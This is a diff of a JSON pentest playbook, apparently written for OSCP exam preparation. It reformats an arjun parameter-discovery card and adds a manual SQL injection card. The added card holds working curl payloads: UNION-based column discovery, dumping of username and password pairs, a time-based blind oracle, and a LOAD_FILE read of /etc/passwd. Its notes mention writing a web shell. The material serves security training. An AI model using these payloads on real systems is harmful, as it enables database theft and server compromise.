@@ -104,19 +104,40 @@
    "title": "Parameter Discovery (arjun)",
    "hypothesis": "A form or endpoint often accepts far more parameters than its HTML reveals, and the hidden one is frequently the injectable one. Fuzzing a known parameter dictionary against the endpoint (arjun) surfaces the accepted GET/POST parameters, so the injection probes have a concrete parameter to test instead of a guess.",
    "tool": "arjun",
-   "tools": ["arjun"],
+   "tools": [
+    "arjun"
+   ],
    "os": [],
    "requires_all": [],
-   "requires_any": ["http.reachable", "web.parameterized", "web.content_map"],
-   "produces": ["web.param_candidate"],
+   "requires_any": [
+    "http.reachable",
+    "web.parameterized",
+    "web.content_map"
+   ],
+   "produces": [
+    "web.param_candidate"
+   ],
    "priority": 78,
    "proves": "surfaces the request parameters an endpoint actually accepts",
    "does_not_prove": "only attack surface, an accepted parameter is not a vulnerability until a probe confirms it injectable",
-   "report": {"finding": "Hidden Request Parameters Discovered", "severity": "info"},
-   "refs": ["https://github.com/s0md3v/Arjun"],
+   "report": {
+    "finding": "Hidden Request Parameters Discovered",
+    "severity": "info"
+   },
+   "refs": [
+    "https://github.com/s0md3v/Arjun"
+   ],
    "commands": [
-    {"tool": "arjun", "run": "arjun -u http://{{target}}/ -m GET,POST", "note": "Fuzzes GET and POST parameter names against the endpoint. Point -u at the specific handler (e.g. /search) once content discovery has found one; each accepted name becomes a probe target."},
-    {"tool": "arjun", "run": "arjun -u http://{{target}}/ -m GET -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt", "note": "A wider sweep with a bigger parameter wordlist when the default set finds nothing."}
+    {
+     "tool": "arjun",
+     "run": "arjun -u http://{{target}}/ -m GET,POST",
+     "note": "Fuzzes GET and POST parameter names against the endpoint. Point -u at the specific handler (e.g. /search) once content discovery has found one; each accepted name becomes a probe target."
+    },
+    {
+     "tool": "arjun",
+     "run": "arjun -u http://{{target}}/ -m GET -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt",
+     "note": "A wider sweep with a bigger parameter wordlist when the default set finds nothing."
+    }
    ]
   },
   {
@@ -259,9 +280,71 @@
    "autonomy": "manual"
   },
   {
+   "id": "manual-sqli-exploitation",
+   "title": "Manual SQL Injection Exploitation",
+   "hypothesis": "Automated injection tools such as sqlmap are prohibited under OSCP examination conditions, so a confirmed injection must be exploited entirely by hand. The workflow is fixed: determine the column count, identify the reflected columns with a UNION SELECT, fingerprint the database and the account it runs as, then extract data one table at a time. Where no output is reflected, fall back to an inference (blind) oracle that recovers one character per request. Where the database account holds the FILE privilege, the same injection reads local files and writes a web shell to the document root, converting data access into code execution.",
+   "tool": "curl",
+   "tools": [
+    "curl"
+   ],
+   "os": [],
+   "requires_all": [
+    "web.sqli_confirmed"
+   ],
+   "requires_any": [],
+   "produces": [
+    "db.creds",
+    "foothold.webshell"
+   ],
+   "priority": 70,
+   "proves": "extracts database contents by hand and, where the account permits, writes a web shell, using no automated tooling",
+   "does_not_prove": "access beyond the database account and the web/application context until the recovered material is cracked or the shell is used",
+   "report": {
+    "finding": "SQL Injection (Manual Exploitation)",
+    "severity": "high"
+   },
+   "refs": [
+    "https://portswigger.net/web-security/sql-injection/union-attacks",
+    "https://portswigger.net/web-security/sql-injection/blind"
+   ],
+   "commands": [
+    {
+     "tool": "curl",
+     "run": "curl -s 'http://{{target}}/page.php?id=1 ORDER BY 5-- -'",
+     "note": "Establish the column count: raise the ORDER BY index until the query errors. The highest index that still returns is the number of columns the SELECT yields."
+    },
+    {
+     "tool": "curl",
+     "run": "curl -s 'http://{{target}}/page.php?id=0 UNION SELECT 1,2,3,4,5-- -'",
+     "note": "Append a UNION SELECT with that many placeholders and note which positions are echoed in the response. Those columns will carry your extracted data."
+    },
+    {
+     "tool": "curl",
+     "run": "curl -s 'http://{{target}}/page.php?id=0 UNION SELECT 1,@@version,database(),current_user(),5-- -'",
+     "note": "Fingerprint the backend through the reflected columns: version, current database, and the account the queries run as. That account's privileges decide whether file read and write are available."
+    },
+    {
+     "tool": "curl",
+     "run": "curl -s 'http://{{target}}/page.php?id=0 UNION SELECT 1,group_concat(username,0x3a,password),3,4,5 FROM users-- -'",
+     "note": "Concatenate the credential columns of the target table into one reflected field to retrieve every row in a single request."
+    },
+    {
+     "tool": "curl",
+     "run": "curl -s 'http://{{target}}/page.php?id=1 AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)=0x61,SLEEP(3),0)-- -'",
+     "note": "When nothing is reflected, infer the data through a timing oracle: this request delays the response only if the first password character is 'a'. Iterate the position and the candidate byte to recover the full value."
+    },
+    {
+     "tool": "curl",
+     "run": "curl -s 'http://{{target}}/page.php?id=0 UNION SELECT 1,LOAD_FILE(0x2f6574632f706173737764),3,4,5-- -'",
+     "note": "With the FILE privilege, LOAD_FILE reads arbitrary local files (here /etc/passwd, hex-encoded to avoid quoting). The same privilege enables INTO OUTFILE to write a web shell into the web root, which is how manual SQLi becomes a foothold."
+    }
+   ],
+   "autonomy": "manual"
+  },
+  {
    "id": "sqlmap-automation",
    "title": "SQLmap Exploitation (post-confirmation)",
-   "hypothesis": "Once you've verified SQLi by hand, sqlmap takes over the heavy lifting: dumping databases, executing OS commands, staging shells. WARNING: sqlmap is EXPLICITLY PROHIBITED on the OSCP exam, regard this card as lab-only. Under exam conditions everything it does must be performed by hand (see sqli-basics). Away from the exam, hand it a captured raw request so the auth cookies and parameters are exactly right.",
+   "hypothesis": "Once you've verified SQLi by hand, sqlmap takes over the heavy lifting: dumping databases, executing OS commands, staging shells. WARNING: sqlmap is EXPLICITLY PROHIBITED on the OSCP exam, regard this card as lab-only. Under exam conditions everything it does must be performed by hand (see manual-sqli-exploitation). Away from the exam, hand it a captured raw request so the auth cookies and parameters are exactly right.",
    "tool": "sqlmap",
    "tools": [
     "sqlmap"
